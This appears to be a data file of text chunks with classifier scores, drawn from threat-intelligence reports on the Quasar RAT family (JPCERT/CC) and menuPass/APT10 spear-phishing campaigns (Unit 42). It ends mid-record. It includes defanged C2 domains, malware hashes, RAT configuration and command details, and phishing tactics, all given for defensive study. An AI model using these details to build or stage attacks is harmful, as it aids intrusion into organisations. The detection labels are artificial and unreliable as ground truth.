        "text": "Vi\u1ec7t Nam\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPrivacy | Legal | Accessibility | Site map\n\n\n\n\n\nCopyright \u00a92023 Trend Micro Incorporated. All rights reserved\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nsXpIBdPeKzI9PC2p0SWMpUSM2NSxWzPyXTMLlbXmYa0R20xk\n\n\n\n\nCliccando su \u201cAccetta tutti i cookie\u201d, l'utente accetta di memorizzare i cookie sul dispositivo per migliorare la navigazione del sito, analizzare l'utilizzo del sito e assistere nelle nostre attivit\u00e0 di marketing.",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": false,
            "confidence": 0.22471922636032104
        },
        "prediction": {}
    },
    {
        "text": "\n\n  \nAttack Activities by Quasar Family - JPCERT/CC Eyes | JPCERT Coordination Center official Blog\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n      \n\n\n\n\n\n\n \n\n\n\n\n\n\n\n\n\nJPCERT/CC Eyes\n\nJPCERT Coordination Center official Blog\n\nLanguage:\n\n\n\u65e5\u672c\u8a9e\nEnglish\n\n\n\n\n\n\n\nTop\u00a0>\u00a0List of \u201cMalware\u201d\u00a0>\u00a0Attack Activities by Quasar Family\n      \n\n\n\n\n\n\n\n\n\n\n\n\n\u559c\u91ce \u5b5d\u592a(Kota Kino)\n\n\n December 10, 2020\n\n\nAttack Activities by Quasar Family\n\n\n\nQuasar\n\n\n\n\n\n\n\n\n\nEmail\n\n\n\n\nQuasar",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.4973399043083191
        },
        "prediction": {}
    },
    {
        "text": "JPCERT/CC has confirmed that a group called APT10 used this tool in some targeted attacks against Japanese organisations. \n",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.6216832995414734
        },
        "prediction": {}
    },
    {
        "text": "As Quasar\u2019s source code is publicly available, there are many variants of this RAT seen in the wild (referred to as \u201cQuasar Family\u201d hereafter).",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.6415126323699951
        },
        "prediction": {}
    },
    {
        "text": "Some of them have been used in attacks against Japanese organisations, and they are seen as a threat as well as Quasar itself. \n",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.5576801896095276
        },
        "prediction": {}
    },
    {
        "text": "This article introduces the details of Quasar and Quasar Family.\n Quasar overview\nQuasar offers many functions which are intended for purposes such as device management, support operation and employee monitoring. Figure 1 describes Quasar\u2019s functions and its supported environment as specified on GitHub.\n Figure 1: Quasar\u2019s functions and supported environment\nThis tool was called \u201cxRAT\u201d at the time of its initial release, however, it was renamed as \u201cQuasar\u201d in August 2015. The latest version is v1.4, released in June 2020.\n",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.4911307692527771
        },
        "prediction": {}
    },
    {
        "text": "Figure 2: Quasar versions\nAs v1.3 and the earlier are still used in recent attacks, this article explains the functions of both v1.3 and v1.4.\n",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.5553836226463318
        },
        "prediction": {}
    },
    {
        "text": "In addition, the entire communication is encrypted with TLS1.2. \n Figure 3 shows the comparison of the communication format in v1.3 and v1.4.\nFigure 3: Quasar\u2019s communication format\nCommunication flow\nIn v1.3, once a client connects to a server, authentication is performed.",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.5245941281318665
        },
        "prediction": {}
    },
    {
        "text": "After that, the main body of data including the commands are exchanged. On the other hand, the authentication is replaced by a TLS handshake in v1.4, and the data exchange begins after that. \n",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.6263442039489746
        },
        "prediction": {}
    },
    {
        "text": "Figure 4 illustrates Quasar\u2019s communication flow between a client and a server.\nFigure 4: Quasar\u2019s communication flow\n\u2003\nConfiguration\nQuasar possesses its configuration in itself.",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.6302982568740845
        },
        "prediction": {}
    },
    {
        "text": "Figure 5: Quasar configuration\nFigure 6: Configuration format\nTable 1 details the configuration for Quasar.\n\n Table 1: Configuration\n\n\nVERSION\nINSTALL\nLOGDIRECTORY (1.3)\n\n\nHOSTS\nSTARTUP\nSERVERSIGNATURE (1.4)\n\n\nPORT (xRAT only)\nMUTEX\nSERVERCERTIFICATESTR (1.4)\n\n\nRECONNECTDELY\nSTARTUPKEY\nSERVERCERTIFICATE (1.4)\n\n\nKEY\nHIDEFILE\nHIDELOGDIRECTORY (1.3)\n\n\nAUTHKEY\nENABLEUACESCALATION (xRAT only)\nHIDELOGSUBDIRECTORY (1.3)\n\n\nDIRECTORY\nENABLELOGGER\nINSTALLPATH (1.4)\n\n\nSUBDIRECTORY\nENCRYPTIONKEY\nLOGSPATH (1.4)\n\n\nINSTALLNAME\nTAG (1.3)\n UNATTENDEDMODE (1.4)\n\n\nCommands\nIn v1.3, command sets are defined for \u201ctypeof\u201d calls.",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.2974358797073364
        },
        "prediction": {}
    },
    {
        "text": "Figure 7 shows some examples of commands defined in Quasar.\n Figure 7: Commands\nQuasar Family\nTable 2 is the list of Quasar Family derived from Quasar which JPCERT/CC confirmed.\n\n Table 2: Quasar Family\n\n\nName\nCategory\nConfiguration\nCommunication protocol\nUse in attacks in the wild\n\n\n\n\nGolden Edition\nClone\nIdentical\nIdentical\nConfirmed\n\n\nXPCTRA\n Clone\nCustom\nIdentical\nConfirmed\n\n\nCinaRAT [2]\nClone\nIdentical\nIdentical\nConfirmed\n\n\nXtremis 2.0 [3]\nClone\nIdentical\nIdentical\nNot confirmed\n\n\n",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.4694577157497406
        },
        "prediction": {}
    },
    {
        "text": "[4]\nClone\nIdentical\nIdentical\nNot confirmed\n\n\nVenomRAT\nClone\nIdentical\nIdentical\nNot confirmed\n\n\nRSMaster [5]\nPartially copied\nCustom\nIdentical\nNot confirmed\n\n\nVoid-RAT\nPartially copied\nCustom\nIdentical\nConfirmed\n\n\nAsyncRAT [6]\nPartially copied\nCustom\nIdentical\nConfirmed\n\n\n\n* \u201cClone\u201d in the category refers to variants which uses the entire source code of Quasar with some functions added or modified. \u201cPartially copied\u201d refers to variants created as a new RAT using parts of the original source code.\n Figure 8 shows the comparison of commands embedded in XPCTRA and Quasar.\n",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.49907761812210083
        },
        "prediction": {}
    },
    {
        "text": "In the comparison above, it is clear that commands in XPCTRA are mostly identical to those in Quasar. \n Figure 9 shows the comparison of the salt value in AsyncRAT and Quasar.\n",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.6163939833641052
        },
        "prediction": {}
    },
    {
        "text": "The salt value in AsyncRAT is identical to that in Quasar. \n As Quasar Family applies some parts of the source code of Quasar, its configuration and communication protocol are also identical.",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.6102790236473083
        },
        "prediction": {}
    },
    {
        "text": "In some cases, some functions are customised, and as a result, some new configuration and commands are added.\n",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.5477055907249451
        },
        "prediction": {}
    },
    {
        "text": "Attack campaigns using Quasar\nQuasar has been used in many attack campaigns. Table 3 lists the differences of Quasar used by each attack group.\n\n",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.5911422967910767
        },
        "prediction": {}
    },
    {
        "text": "Table 3: Example of Quasar used by attack group\n\n\nAttack group\nQuasar version\nCustomisation\nObfuscation\n\n\n\n\nAPT33\n1.3.0.0\nNo\nConfuserEx v1.0.0\n\n\nGorgon Group\n-\nNo\n\n\n\nAPT-C-09\n2.0.0.0 RELEASE3\nNo\n\n\n\nDustySky\n1.1.0.0\nNo\n\n\n\nAPT10\n2.0.0.0(Custom Version)\n Yes\nConfuserEx v1.0.0\n\n\n\nThe original Quasar with the default configuration value was used in most cases.",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.3247184157371521
        },
        "prediction": {}
    },
    {
        "text": "Figure 10 shows an example configuration of Quasar used by APT 33.\n Figure 10: Configuration of Quasar used by APT33\nIn most parts, the default values of the builder generating Quasar are used as is, except for STARTUPKEY. This way, attacker groups use the default values as per the original to avoid leaving any distinctive evidence.\n",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.514768660068512
        },
        "prediction": {}
    },
    {
        "text": "In some cases, attackers customise Quasar. For example, APT 10 updated some features and used it in some attacks.",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.439793199300766
        },
        "prediction": {}
    },
    {
        "text": "The following sections will cover the details of this custom Quasar.\n Configuration\nQuasar used by APT 10 (hereafter \u201ccustom Quasar\u201d) has the following additional values in the configuration.\n\n DOWNLOAD_URL\nPROXY\n\nFigure 11 shows the comparison of configuration in the custom Quasar and the original Quasar.\n Figure 11: Comparison of configuration(Left: custom Quasar / Right: original Quasar)\n",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.5985838174819946
        },
        "prediction": {}
    },
    {
        "text": "This ensures that the custom Quasar is able to communicate with a C2 server even if the target\u2019s environment uses proxy servers. \n While the original Quasar uses CBC mode when encrypting configuration with AES, the custom Quasar uses CFB mode.\nFigure 12: Comparison of AES code(Left: custom",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.646888017654419
        },
        "prediction": {}
    },
    {
        "text": "Right: original Quasar)\nAdded/deleted commands\nThere are some changes to the commands in the custom Quasar. Figure 13 shows the comparison of commands in the custom Quasar and the original Quasar.\n Figure 13: Comparison of commands(Left: custom Quasar / Right: original Quasar)\n",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.6198920607566833
        },
        "prediction": {}
    },
    {
        "text": "In the custom Quasar, new commands DoPlugin and DoPluginResponse are added while some including keylogger are deleted. \n With DoPlugin, new functions can be added by loading additional plugin modules. These new modules can be deleted with DoPluginResponse. \n",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.5317292809486389
        },
        "prediction": {}
    },
    {
        "text": "This change enables Quasar to dynamically extend its functions with commands while maintaining Quasar itself as simple as it can be.",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.5633225440979004
        },
        "prediction": {}
    },
    {
        "text": "The custom Quasar has a function to create error logs. The file path of the error logs is hardcoded in itself.\n",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.7114071249961853
        },
        "prediction": {}
    },
    {
        "text": "Error log creation\nCommunication protocol\nThe encryption algorithms for communication with a C2 server also differs in the custom Quasar. While the original Quasar uses AES and QuickLZ, the custom Quasar also uses XOR encoding. Figure 15 shows the XOR encoding process added to the custom Quasar.\n Figure 15: XOR encoding process\nFor AES encryption, the custom Quasar uses CFB mode instead of CBC mode, as seen in the configuration.",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.5712360143661499
        },
        "prediction": {}
    },
    {
        "text": "The encryption methods are as follows:\n\nOriginal Quasar: QuickLZ + AES (mode CBC)\nCustom Quasar: QuickLZ + AES (mode CFB)",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.6575027108192444
        },
        "prediction": {}
    },
    {
        "text": "+ XOR \n\nC2 server activities\nJPCERT/CC investigated the activities of Quasar Family C2 servers based on the characteristics discussed above. As of November 2020, 76 IP addresses running as C2 servers have been identified.\n Figure 16 shows the distribution of Quasar Family C2 servers which were revealed in this investigation.\n Figure 16: C2 server distribution\nMultiple C2 servers are still running in different countries, which indicates its activeness.\n In closing\nBesides Quasar, other open source RATs are being used in ongoing attack cases [7].",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.37152671813964844
        },
        "prediction": {}
    },
    {
        "text": "Attackers are taking advantage of these tools to make attribution difficult and reduce the cost for developing attack infrastructure.",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.6696202158927917
        },
        "prediction": {}
    },
    {
        "text": "A tool to support Quasar analysis (compatible with Quasar v1.3 only) is available on GitHub.",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.5970321297645569
        },
        "prediction": {}
    },
    {
        "text": "Kota Kino, Shusei Tomonaga\nIn cooperation with Tomoaki Tani \n(Translated by Yukako Uchida)\n\nReference\n[1] GitHub: Quasar \nhttps://github.com/quasar/Quasar\n[2] GitHub: CinaRAT \nhttps://github.com/wearelegal/CinaRAT\n[3] GitHub: Xtremis 2.0 \nhttps://github.com/pavitra14/Xtremis-V2.0\n[4] GitHub: QuasarStrike \nhttps://github.com/Q-Strike/QuasarStrike\n[5] GitHub: RSMaster \nhttps://github.com/Netskyes/rsmaster\n[6] GitHub: AsyncRAT \nhttps://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp\n[7] Japan Security Analyst Conference 2020 (Opening Talk): Looking back on the incidents in 2019 \nhttps://jsac.jpcert.or.jp/archive/2020/pdf/JSAC2020_0_JPCERT_en.pdf\n\n\n\n\n\n\n\nEmail\n\n\n\n\n\nAuthor\n\n\n\n\n\n\n\u559c\u91ce \u5b5d\u592a(Kota Kino)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nKota Kino is Malware/Forensic Analyst at Incident Response Group, JPCERT/CC since August 2019.\n\n\n\n\n\n\n\n\n\n\n",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.08670482039451599
        },
        "prediction": {}
    },
    {
        "text": "If you wish to make comments or ask questions, please use this form.\n\n This form is for comments and inquiries.",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.5061925649642944
        },
        "prediction": {}
    },
    {
        "text": "Related articles\n\n\n\n\n\n\n\nMalDoc in PDF - Detection bypass by embedding a malicious Word file into a PDF file \u2013\n\n\n\n\n\n\n\n\n\nYAMA-Yet Another Memory Analyzer for malware detection\n\n\n\n\n\n\n\n\n\n DangerousPassword attacks targeting developers\u2019 Windows, macOS, and Linux environments\n\n\n\n\n\n\n\n\n\nHow to Create F.L.I.R.T Signature Using Yara Rules for Static Analysis of ELF Malware\n\n\n\n\n\n\n\n\n\nGobRAT malware written in Go language targeting Linux routers\n\n\n\n\n\n\n\n\nBack\n\n\nTop\n\n\nNext\n\n\n\n\n\n\n\n\n\u00d7\u691c\u7d22\u00a0\u30ab\u30b9\u30bf\u30e0\u691c\u7d22 \u8868\u793a\u9806:RelevanceRelevanceDate\n\n\n\nCategories\n\n\nMalware\n\n\nIncident\n\n\nEvent\n\n\nVulnerability\n\n\nSecurity Technology\n\n\nForensic\n\n\nCyber Metrics\n\n\nICS-OT\n\n\nOther\n\n\n\n\n\n\nTags\n\n\nPython\n\n\nConference\n\n\nDatper\n\n\nChChes\n\n\nTraining\n\n\nStatistics and Indicator\n\n\nTool\n\n\nBlackTech\n\n\nLogonTracer\n\n\nReport\n\n\nSplunk\n\n\nElasticStack\n\n\nimpfuzzy\n\n\nvolatility\n\n\nRedLeaves\n\n\nPlugX\n\n\nDarkHotel\n\n\nBanking malware\n\n\nPacific_Islands\n\n\nCSIRT\n\n\nPassword\n\n\nPolicy\n\n\nDDoS\n\n\nAPT\n\n\nTrend\n\n\nAfrica\n\n\nSecureCoding\n\n\nSysmonSearch\n\n\nJSAC\n\n\nIoT\n\n\nIIoT\n\n\nQuasar\n\n\nLODEINFO\n\n\nLazarus\n\n\nEmotet\n\n\nPhishing\n\n\nMetrics\n\n\nTSUBAME\n\n\nStandard-Guideline\n\n\n\n\n      \n            \n      \n\n\n        \n  \n  \u3000\n\nRanking\n\n\n\n\n1\n\n\n\n\n\n\n\nMalDoc in PDF - Detection bypass by embedding a malicious Word file into a PDF file \u2013 \n\n\n\n\n\n\n2\n\n\n\n\n\n\n\nTSUBAME Report Overflow (Jul-Sep 2023) \n\n\n\n\n\n\n3\n\n\n\n\n\n\n\nHow to Use Volatility 3 Offline \n\n\n\n\n\n\n4\n\n\n\n\n\n\n\nWindows Commands Abused by Attackers \n\n\n\n\n\n\n5\n\n\n\n\n\n\n\nAnti-UPX Unpacking Technique \n\n\n\n\n\n\n\n\n\n\nAuthors\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nArchives\n\n202318\n202219\n202120\n202021\n201918\n201812\n201717\n201618\n201520\n201418\n20137\n20122\n20118\n20104\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nJPCERT/CC\n\n8F Tozan Bldg, 4-4-2 Nihonbashi-Honcho, Chuo-ku, Tokyo 1030023 JAPAN\nTEL: +81-3-6271-8901\u3000FAX: +81-3-6271-8908\n\n\n\n\n\nPrivacy Policy\nDisclaimer\n\n\n\n\u00a9 1996-2023 JPCERT/CC\n\n\n\n\n\n",
        "source": "Attack Activities by Quasar Family - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.15266108512878418
        },
        "prediction": {}
    },
    {
        "text": "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nmenuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nMenu\n\n\n\n\n\n\nTools\nATOMs\nSecurity Consulting\nAbout Us\nUnder Attack?\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nAbout Unit 42\n\n\nServices\n\n\n\n\n\n\nServices\n\n\n\nAssess and Test Your Security Controls \n\n\n\n\nCompromise Assessment\n\n\nRansomware Readiness Assessment\n\n\nBreach Readiness Review\n\n\nCyber Risk Assessment\n\n\nM&A Cyber Due Diligence\n\n\nPenetration Testing\n\n\nPurple Teaming\n\n\nTabletop Exercises\n\n\nSupply Chain Risk Assessment\n\n\nUnit 42 Retainer\n\n\nBEC Readiness Assessment\n\n\nAttack Surface Assessment\n\n\n\n\n\n\n\n\nTransform Your Security Strategy \n\n\n\n\nSecurity Program Design\n\n\nVirtual CISO\n\n\n\n\n\n\n\n\nRespond in Record Time\n\n\n\n\nIncident Response\n\n\nUnit 42 Retainer\n\n\nManaged Detection and Response\n\n\nManaged Threat Hunting\n\n\nCloud Incident Response\n\n\nDigital Forensics\n\n\nIncident Response Plan Development & Review\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nUNIT 42 RETAINER\nCustom-built to fit your organization's needs, you can choose to allocate your retainer hours to any of our offerings, including proactive cyber risk management services.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": false,
            "confidence": 0.29277271032333374
        },
        "prediction": {}
    },
    {
        "text": "Learn how you can put the world-class Unit 42 Incident Response team on speed dial.\n\n\n ",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.686214029788971
        },
        "prediction": {}
    },
    {
        "text": "Unit 42\nTags: MenuPass\n\n\n\n \n\n\n\n \nThis post is also available in: \n    \u65e5\u672c\u8a9e (Japanese)In 2016, from September through November, an APT campaign known as \u201cmenuPass\u201d\u00a0 targeted Japanese academics working in several areas of science, along with Japanese pharmaceutical and a US-based subsidiary of a Japanese manufacturing organizations. In addition to using PlugX and Poison Ivy (PIVY), both known to be used by the group, they also used a new Trojan called \u201cChChes\u201d by the Japan Computer Emergency Response Team Coordination Center (JPCERT).\u00a0 ",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": false,
            "confidence": 0.45460113883018494
        },
        "prediction": {}
    },
    {
        "text": "In contrast to PlugX and PIVY, which are used by multiple campaigns, ChChes appears to be unique to this group.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": false,
            "confidence": 0.49807384610176086
        },
        "prediction": {}
    },
    {
        "text": "An analysis of the malware family can be found later in this blog.\n Interestingly, the ChChes samples we observed were digitally signed using a certificate originally used by HackingTeam and later part of the data leaked when they were themselves hacked. Wapack labs also observed a similar sample targeting Japan in November.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.6562018394470215
        },
        "prediction": {}
    },
    {
        "text": "It\u2019s not clear why the attackers chose to use this certificate, as it was old, had been leaked online, and had already been revoked by the time they used it. Digital certificates are typically used because they afford an air of legitimacy, which this one definitely does not.\n",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.5627458691596985
        },
        "prediction": {}
    },
    {
        "text": "The attackers spoofed several sender email addresses to send spear phishing emails, most notably public addresses associated with the Sasakawa Peace Foundation and The White House. All the spear phishes were socially engineered with subjects appropriate for the target and the apparent sender. One of the more interesting subject lines was used in the White House attack; \u201c[UNCLASSIFIED] The impact of Trump\u2019s victory to Japan,\u201d sent two days after the election.\u00a0 ",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.6518101096153259
        },
        "prediction": {}
    },
    {
        "text": "Most of the attacks against academics involved webmail addresses using names of academics but are not tied to those academics openly online.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.6558265089988708
        },
        "prediction": {}
    },
    {
        "text": "Recent menuPass activity and some ties to older infrastructure\nThe C2 infrastructure in these attacks is largely actor registered, with only a few Dynamic Domain Name System (DDNS) domains. menuPass typically makes use of a mix of DDNS and actor-registered domains in their attack campaigns. All of the related hashes and C2s are in appendix at the end of this blog.\n Ties to menuPass\nThere is not much public information about the APT campaign called menuPass (also known as Stone Panda and APT10).\u00a0  A paper from FireEye in 2013 on several campaigns using PIVY included menuPass as one of them.\u00a0 ",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": false,
            "confidence": 0.3672569990158081
        },
        "prediction": {}
    },
    {
        "text": "The group name is derived from one of the passwords they use with PIVY in their attacks.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.7194610238075256
        },
        "prediction": {}
    },
    {
        "text": "Believed to have started activity in 2009 and to originate from China, the group initially was known for targeting US and overseas defense contractors but broadened their targeting as time passed.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.6091365218162537
        },
        "prediction": {}
    },
    {
        "text": "The newer ChChes malware family uses an import hash (bb269704ba8647da97377440d403ae4d) shared with other tools used by menuPass, affording an initial link. However, the ties are most strongly proved through infrastructure analysis, which shows a number of links between the newer infrastructure used in these attacks and older infrastructure publicly associated with the group. The three circled domains represent C2s publicly reported as tied to menuPass, linked to domains not previously publicly reported as associated.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.5389614701271057
        },
        "prediction": {}
    },
    {
        "text": "These are only a few of multiple overlaps analysts can find while researching menuPass infrastructure.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.6601722240447998
        },
        "prediction": {}
    },
    {
        "text": "The circled known domains are the first three below:\n\napple[.]cmdnetview[.]com\nfbi[.]sexxxy[.]biz\ncvnx[.]zyns[.]com\ncia[.]toh[.]info\n2014[.]zzux[.]com\niphone[.]vizvaz[.]com\n\n\nFigure 2.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": false,
            "confidence": 0.43719446659088135
        },
        "prediction": {}
    },
    {
        "text": "menuPass infrastructure overlaps\nTwo of these domains can further be tied into the newer C2 infrastructure.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.6850286722183228
        },
        "prediction": {}
    },
    {
        "text": "Again, these are only a few of the overlaps that can be uncovered by analyzing the infrastructure used by menuPass.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.6905598044395447
        },
        "prediction": {}
    },
    {
        "text": "The domains in the below figure are:\n\ncia[.]toh[.]info\n2014[.]zzux[.]com\nwchildress[.]com\nlion[.]wchildress[.]com\nkawasaki[.]unhamj[.]com\nsakai[.]unhamj[.]com\nkawasaki[.]cloud-maste[.]com\nfukuoka[.]cloud-maste[.]com\nyahoo[.]incloud-go[.]com\nmsn[.]incloud-go[.]com\nwww[.]mseupdate[.]ourhobby[.]com\ncontractus[.]qpoe[.]com\n\n\nFigure 3.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": false,
            "confidence": 0.28035813570022583
        },
        "prediction": {}
    },
    {
        "text": "Additionally, the passwords in the PIVY samples also fit known passwords used by the group \u2013 three samples use \u201cmenuPass\u201d and the other uses \u201ckeaidestone.\u201d\u00a0  With these data points, we assess with high confidence the recent attacks were conducted by the menuPass group.\n Following is our analysis of the ChChes malware family.\n Malware Analysis\nFor this analysis, Unit 42 looked at the following file:\n\n\n\nMD5\nc0c8dcc9dad39da8278bf8956e30a3fc\n\n\nSHA1\n009b639441ad5c1260f55afde2d5d21fc5b4f96c\n\n\nSHA256\n6605b27e95f5c3c8012e4a75d1861786fb749b9a712a5f4871adbad81addb59e\n\n\nCompile Time\n2016-11-24 01:31:37 UTC\n\n\n\n\u00a0\nThis malware is provided with an icon that appears to be that of a Microsoft Word document, as we can see in the image below.\n\n",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": false,
            "confidence": 0.4215695858001709
        },
        "prediction": {}
    },
    {
        "text": "Icon used for ChChes\nAdditionally, we discovered that the samples identified in attacks against Japanese organizations were digitally signed using the certificate originally used by the Italian-based company, HackingTeam. Readers may recall that HackingTeam was compromised and subsequently had a large amount of internal data exposed in July 2015.",
        "source": "menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations.html",
        "detection": {
            "response": true,
            "confidence": 0.7084301710128784
        },
        "prediction": {}
    },
    {
